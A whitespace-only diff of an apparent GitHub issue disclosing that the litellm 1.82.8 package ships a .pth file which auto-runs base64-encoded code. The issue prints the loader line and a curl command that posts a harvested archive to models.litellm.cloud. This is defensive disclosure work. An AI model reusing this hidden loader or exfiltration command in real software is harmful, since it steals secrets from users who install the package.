@@ -14,7 +14,7 @@ tags:
 
 BerriAI
 
- 
+
 
 /
 
@@ -40,8 +40,8 @@ potential-duplicate
 ## Description
 
 isfinne
-opened 
-on 
+opened
+on
 Mar 24, 2026
 Issue body actions
 
@@ -60,7 +60,7 @@ litellm_init.pth,sha256=ceNa7wMJnNHy1kRnNCcwJaFjWX3pORLfMh7xGL8TUjg,34628
 ## Reproduction
 
 pip download litellm==1.82.8 --no-deps -d /tmp/check
-python3 -c 
+python3 -c
 "
 
 import zipfile, os
@@ -82,13 +82,13 @@ with zipfile.ZipFile(whl) as z:
 You will seelitellm_init.pthcontaining:
 
 import
- 
+
 os
-, 
+,
 subprocess
-, 
+,
 sys
-; 
+;
 subprocess
 .
 Popen
@@ -96,9 +96,9 @@ Popen
 sys
 .
 executable
-, 
+,
 "-c"
-, 
+,
 "import base64; exec(base64.b64decode('...'))"
 ])
 
@@ -137,17 +137,17 @@ The script collects sensitive data from the host system:
 6. The archive is exfiltrated via:
 
 curl -s -o /dev/null -X POST \
- 
+
 "
 https://models.litellm.cloud/
 "
  \
- -H 
+ -H
 "
 Content-Type: application/octet-stream
 "
  \
- -H 
+ -H
 "
 X-Filename: tpcp.tar.gz
 "
